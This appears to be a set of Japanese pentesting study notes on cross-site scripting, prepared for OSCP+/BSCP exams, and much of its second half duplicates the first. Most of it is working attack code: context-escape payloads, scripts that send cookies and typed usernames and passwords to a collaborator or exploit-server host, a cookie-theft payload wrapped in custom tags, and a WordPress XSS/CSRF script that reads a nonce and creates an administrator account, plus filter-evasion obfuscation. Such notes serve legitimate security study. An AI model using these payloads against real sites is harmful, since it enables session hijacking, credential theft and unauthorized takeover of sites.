- 参考リンク：
	- 🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 
	- 🔗[OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

>[!NOTE]
>OSCP+試験では、XSSのようなClient-sideの攻撃は基本的に出題されない傾向にある。
>XSSの検証には、Burp Suiteの**有料機能**である COLLABORATOR が必要なケースがある（OSCP+では使用しなかった）。

---

# 注目ポイント

- Post Comment機能
- Search機能
- 怪しいJavaScriptファイル
- Check Stock機能
- Cookieの値が `username:token` の形式
- Remember me機能（Stay-logged-in Cookie）
- LiveChat機能

---

# Detection

## 🔗[XSStrike](https://github.com/s0md3v/xsstrike)（自動検出）

XSSに特化した検出ツール。手動のIntruder Scanより速い。

> [!WARNING]
> XSSに脆弱でないものでも検知してしまうことがある（False positive）。
> "certain"の表示に注意すること。またペイロードは難解なものが生成されるため、**Detectにのみ使用し、Exploitには期待しない**こと。

```zsh
cd <path_to_XSStrike>

# GET
python3 xsstrike.py -u "<URL>"

# POST
python3 xsstrike.py -u "<URL>" --data "<bodyのパラメータと値>"

# HTTPヘッダも追加する場合
python3 xsstrike.py -u "<URL>" --headers
```

---

# Fuzz

[パラメータ・値のファジング](../../Tools/🐙FFUF.md#パラメータ・値のファジング)でも可

DevToolsのConsoleタブでエラーを観測しながらcontextを調整する。
```html
<script>alert(1)</script>
```

```html
<img src=1 onerror="alert(1)">
```

```html
<script src="data:,alert(1);//"></script>
```

---

# Cookie窃取スクリプト

COLLABORATOR必要。

`alert(1)` の動作確認が取れたら以下に差し替える：
```js
document.location='https://COLLABORATOR_DOMAIN?c='+document.cookie;
```

```js
fetch('https://COLLABORATOR_DOMAIN?c='+document.cookie)
```

難読化が必要な場合：
```js
eval(atob("<base64エンコードした上記ペイロード>"))
```
- → [Web攻撃の難読化](../Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md)

---

# XSS Contexts（注入箇所別の手法）

## HTMLタグ内への注入

> [!WARNING] 
> HTMLタグ内にXSSペイロードを注入するとき、タグは `>` だけで閉じることができる。開発者ツールで注入後のcontextを確認し、文法を維持すること。

検索機能を例にすると、検索した結果、以下のように表示されるとする
```html
<h1>0 search results for '<userinput>'</h1>
```

これに対して、`</h1>`とすることなく、`>`でタグを閉じ、`<body...`のようなペイロードを注入できる
```
"><body onresize=print()>"
```

### HTMLタグ内のXSSメソドロジー

1. 有効なタグを割り出すため、🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers)でCopy tags to clipboardしてBurp Suite IntruderのPayload settingsにペースト
```http
GET /?search=<§§> HTTP/2
```

2. 有効なイベントを割り出すため、cheat sheetのCopy events to clipboardをクリックし、ペースト（`%20` = 空白）
```http
GET /?search=<有効なタグ%20§§=1> HTTP/2
```

3. 🔗[XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)からタグとイベントを選択し、有効なペイロード候補を取得する
  
### すべてのタグが禁止されている場合

custom tagを使用してエクスプロイトサーバにホストし、deliverする
```html
<script>
    location = 'https://<target_ip>/?search=<xss+id=x+onfocus=document.location=\'https://COLLABORATOR_DOMAIN/?c=\'+document.cookie tabindex=1>#x';
</script>
```

---

## HTMLタグ属性内への注入

`<>` は注入できなくても引用符を注入できる場合に、新たな属性を追加してエクスプロイトする。

> [!WARNING] 
>[ブラウザ開発者ツール](ブラウザ開発者ツール.md)で注入後のcontextを確認し、文法を維持すること。

例：
```html
<input type="text" value="<user_input>" name="username">
```
	↓
```html
<input type="text" value="" autofocus onfocus=alert(document.cookie) x="" name="username">
```

### href属性へのJavaScript注入

```html
<a href="javascript:alert(document.cookie)">
```

リンクをクリックするとスクリプトが実行される。

### headタグ内のcanonical属性へのXSS

1. `<head>` タグ内に `canonical` が設定されていることを確認する
2. クエリストリングを検索し、`<link rel="canonical" href="">` のhrefに反映されるか確認する
```html
<link rel="canonical" href='https://<example>/?aaa'/>
```

3. hrefへの反映を悪用してペイロードを注入する
```html
http://example/?'accesskey='x'onclick='alert(1)
```
↓
```html
<link rel="canonical" href="https://<example>/?" accesskey="x" onclick="alert(1)">
```

---

## JavaScriptへの注入

### 既存スクリプトを強制終了させて任意のJSを実行する

1. スクリプト内にユーザーが制御可能な値が存在する箇所を見つける

```js
<script>
    var input = '<user_input>';
</script>
```

2. 既存のスクリプトを閉じさせてペイロードを注入する
```js
</script><img src=1 onerror=alert(document.cookie)>
```

### 引用符で囲まれた文字列からの脱却

基本
```js
'-alert(1)-'
```
```js
';alert(1)//
```

**引用符がバックスラッシュでエスケープされるケース：**
1. 引用符（`'` or `"`）を入力し、`\` でエスケープされることを確認する
2. `\` を入力し、エスケープされない脆弱性があるか確認する
3. ペイロードに `\` を追加して送信する
```js
\';alert(1)//'
```

### HTMLエンコードの利用

引用符で囲まれた属性値にJavaScriptが存在するとき
```html
<a href="#" onclick="... var input='<user_input>'; ...">
```

引用符をHTMLエンコードして脱却する
```js
&apos;-alert(1)-&apos;
```

URLとして組み込む場合
```url
http://foo?&apos;-alert(1)-&apos;
```

🔗[Web Security Academy Lab](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)

### JSテンプレートリテラルへの注入

入力した内容がテンプレートリテラル（`` ` ` ``）に埋め込まれているケース。**既存のJSを終了させる必要がない**のが特徴。

```js
<script>
    var input = `<user_input>`;
</script>
```

`${}` でJSの式を埋め込む
```js
${alert(1)}
```

---

# OAST（帯域外通信）

COLLABORATORが必要。

## Username & Password の取得

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR_DOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
- → Request to collaboratorを確認する

## Cookieの取得

### Comment機能の場合

```html
<script>
fetch('https://COLLABORATOR_DOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

### Cookieが `username:token` の形式の場合

`username` の箇所に以下を注入する：
```
'"><svg/onload=fetch(`//COLLABORATOR_DOMAIN/${encodeURIComponent(document.cookie)}`)>:<session_id>
```

- `encodeURIComponent()`：URLの一部としてCookieを送るときに使用する

→ Request to collaboratorを確認する

---

# Privilege Escalation w/ XSS & CSRF

**シナリオ：**

- CookieにHTTP onlyフラグが付与されていてJavaScriptで窃取できないとき
- CMSでアカウント作成等のHTTPリクエストを使用した処理が実行され、nonceが使われているとき

**目的：** 高権限のユーザーを作成する

参考：🔗[How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/)

## 手順

1. ソースコードまたはFuzzingでXSSに脆弱なHTTPヘッダ等を特定する （例：Visitorsプラグインの `user-agent` が脆弱であるとする）
    
2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャする
    
3. nonceを抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成する
    

**nonce抽出：**

```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php"; // アクション実行先のURL
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false); // falseで同期通信にしてnonceを確実に取得
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

**抽出したnonceを使用してアクションを実行：**

```js
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

4. [JS: CharCodeAt()による難読化](https://claude.ai/Evasion\(OSCP+%E8%A9%A6%E9%A8%93%E7%AF%84%E5%9B%B2%E5%A4%96\)/Web%E6%94%BB%E6%92%83%E3%81%AE%E9%9B%A3%E8%AA%AD%E5%8C%96.md)を適用する
    
5. 難読化したスクリプトをBurp SuiteでXSSに脆弱な箇所（`user-agent`など）に埋め込み、ルートディレクトリへGETリクエストを送信する（`<script></script>` で囲む）
    

![](https://claude.ai/Images/Pasted%20image%2020250321200240.png)

6. Visitorsプラグインを確認し、user-agentに何も記載されていなければ成功

![](https://claude.ai/Images/Pasted%20image%2020250320123601.png)

![](https://claude.ai/Images/Pasted%20image%2020250320123617.png)

---

# Misc

## 難読化

```js
<img src=1 onerror=alert(1)>
```

↓

```js
<img src=1 oNeRrOr=alert`1`)
```

- `alert\`1` `：テンプレートリテラルを関数の引数として渡す形式（`alert(1)` 相当）
- その他：🔗[XSS cheat sheet - Obfuscation](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#obfuscation)

## クエリストリングへの埋め込み

```http
/any?xss='><script>alert(1)</script>
```

## URLエンコードで実行されない場合

→ Webキャッシュポイズニングを試みる：[正規化されたCache keyの悪用](https://claude.ai/BSCP/Advanced/Web%20cache%20poisoning/4.%20%E3%82%AD%E3%83%A3%E3%83%83%E3%82%B7%E3%83%A5%E5%AE%9F%E8%A3%85%E3%81%AE%E6%AC%A0%E9%99%A5%E3%81%AE%E6%82%AA%E7%94%A8/3.%20%E5%AE%9F%E8%A3%85%E3%81%AE%E6%AC%A0%E9%99%A5%E3%81%AE%E6%82%AA%E7%94%A8.md#%E6%AD%A3%E8%A6%8F%E5%8C%96%E3%81%95%E3%82%8C%E3%81%9FCache%20key%E3%81%AE%E6%82%AA%E7%94%A8)

## 基本ペイロード早見表

**Reflected XSS：**

```html
<!-- ユーザー操作不要 -->
<iframe src="https://<target_ip>?<vuln_param>=<payload>">

<!-- ユーザー操作が必要（iframeが禁止されているときに有効） -->
<script>
location = 'https://<target_ip>?<vuln_param>=<payload>'
</script>
```

**Stored XSS：**

```html
<script>alert(1)</script>
```

```html
<img src=1 onerror=alert(1)>
```

## Stay-logged-in Cookieの取得

1. Comment機能の特定パラメータに以下を注入する

```js
<script>
    document.location='https://EXPLOIT_DOMAIN/c='+document.cookie
</script>
```

2. エクスプロイトサーバのAccess Logを確認しCookieを入手する


---
---


## HTMLタグ内でのXSS

##### 🚨：HTMLタグ内でのXSSペイロード注入時の注意点

- HTML内に注入される時、タグは`>`だけで閉じることができる
```html
<h1>0 search results for 'ユーザの入力'</h1>
```
のとき、
```
"><body onresize=print()>"
```

---
### HTMLタグ内のXSSメソドロジー

1. 有効なtagを割り出す。[xss cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#event-handlers)でCopy tags to clipboardしてPayload settingsにペースト
```http
GET /?search=<§§> HTTP/2
...
```

2. 有効なeventを割り出す。cheat sheetのCopy events to clipboardしてペースト(`%20`=空白)
```http
GET /?search=<有効なタグ%20§§=1> HTTP/2
...
```

3. [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)からタグとイベントを選択し、有効なpayload候補を取得する。
4. コンテキストに合わせ改変したペイロードをエクスプロイトサーバにホストしてView Exploitで検証する[4. XSS contexts](#🚨：HTMLタグ内でのXSSペイロード注入時の注意点)
```html
<iframe src="https://0a4b003c0362b495817bca6e00b4007f.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

---
#### すべてのタグが禁止されている場合

すべて禁止されてはないけどXSS cheat sheetに有効そうなタグがないときも

- custom tagを使用する
- エクスプロイトサーバにホストしdeliver
```html
<script>
	location = 'https://TARGET_NET/?search=<xss+id=x+onfocus=document.location='https://COLLABORATOR_DOMAIN/?c='+document.cookie tabindex=1>#x';
</script>
```

---

## JavaScriptへのXSS

### 既存のスクリプトを強制終了させ任意のJSを実行する方法

1. スクリプト内にユーザが制御可能(入力等)な値が存在する箇所を見つける
```js
<script> 
... var input = 'ここに入力'; 
... 
</script>
```

2. 既存のスクリプトを閉じさせてペイロードを注入する
```js
</script><img src=1 onerror=alert(document.cookie)>
```

---


---

---
## Misc

###### 難読化

```js
<img src=1 onerror=alert(1)>
```
	↓
```js
<img src=1 oNeRrOr=alert`1`)
```
- alertはテンプレートリテラルを使用。alertという関数の引数としてバッククウォートで囲まれた1を渡す

- その他 [XSS cheat sheet Obfuscation](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#obfuscation:~:text=27%27%3B%22%3EXSS%3C/a%3E-,Obfuscation,-Data%20protocol%20inside)
- [OWASP XSS Filter Evasion](### Filter Bypass Alert Obfuscation[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#filter-bypass-alert-obfuscation "Permanent link"))

###### クエリストリングへの埋め込み

```http
/any?xss='><script>alert(1)</script>
```

###### もしURLエンコードされて実行されないならWebキャッシュポイズニング

- [3. 実装の欠陥の悪用](../../../BSCP/Advanced/Web%20cache%20poisoning/4.%20キャッシュ実装の欠陥の悪用/3.%20実装の欠陥の悪用.md#正規化されたCache%20keyの悪用)

###### Stay-logged-in Cookieを取得

1. Comment機能の特定パラメタに以下のスクリプトを注入
```js
<script>
	document.location='https://EXPLOIT_DOMAIN/c='+document.cookie
</script>
```

2. エクスプロイトサーバのAccess logを確認し、Cookieを入手する

---

### Privilege Escalation w/XSS & CSRF

(cookieを窃取して実行する方法はBSCPノートを閲覧)

- 目的：高権限のユーザーを作成

- 攻撃のシチュエーション：
	- CookieにHTTP onlyフラグが付与されていて、JavaScriptでは窃取できないとき
	- CMSでアカウント作成等のHTTPリクエストを使用した処理が実行され、nonceが使われているとき

- 参考：🔗[How to craft an XSS payload to create an admin user in WordPress](https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/)

#### 手順

1. ソースコードもしくはFuzzingでXSSに脆弱なHTTPヘッダーなどを洗い出す（BSCPノートを参照）
	（今回はVisitorsプラグインの`user-agent`が脆弱であるとする）

2. HTTPリクエストを使用した処理（ユーザー作成等）のリクエストをBurpでキャプチャしておく

3. nonceの値を抽出し、そのnonceを使ってユーザーを作成するスクリプトを作成（コメントは削除して使用）

nonce抽出
```js
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```
- 3行目にアクション実行先のHTTPリクエスト
- 4行目第三引数をfalseとすることで、同期通信になる。nonceを確実に抽出する目的

抽出したnonceを使用してアクションを実行するリクエストを作成する
```js
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```
- 1行目に、アクションのHTTP POSTリクエストのパラメタ、かつ、必須の値を指定している

4. [Web攻撃の難読化](../Evasion(OSCP+試験範囲外)/Web攻撃の難読化.md)のJS: CharCodeAt()に従い難読化する。

5. 難読化したスクリプトをBurpSuiteを用いてXSSに脆弱な箇所に埋め込み、ルートディレクトリへGETリクエストをSend（`<script></script>`で囲む）

![](../../Images/Pasted%20image%2020250321200240.png)

6. ステップ1に記載の通り、Visitorsプラグインを閲覧し、user-agentが何も記載されていないことを確認できれば成功

![](../../Images/Pasted%20image%2020250320123601.png)

![](../../Images/Pasted%20image%2020250320123617.png)

---

### OAST

###### username & passwordを取得

1. Comment機能の特定パラメタに以下のスクリプトを注入
```http
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLABORATOR_DOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
2. Request to collaboratorを確認

##### Cookieを取得する

###### Comment機能の場合

1. Comment機能の特定パラメタに以下のスクリプトを注入
```http
<script>
fetch('https://COLLABORATOR_DOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
2. Request to collaboratorを確認

###### Cookieがusername:tokenの場合

1. `username`の箇所にスクリプトを注入
```
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```
- `encodeURIComponent()`: URLの一部としてcookieを送るときに使用
2. Request to collaboratorを確認

---
## Misc

###### Reflected XSS基本payload

1. no user interaction in HTML
```html
<iframe src="https://TARGET_NET?[vuln_param]=[payload]">
```
![[Pasted image 20240218101126.png | 50]]↓

2. need user interaction(iframeは禁止されているからこれでうまくいくことが多い)
```html
<script>
location = 'https://<target_ip>?[vuln_param]=[payload]'
</script>
```

###### Stored XSS基本payload
```js
<script>alert(1)</script>
```

```html
<img src=1 onerror=alert(1)>
```
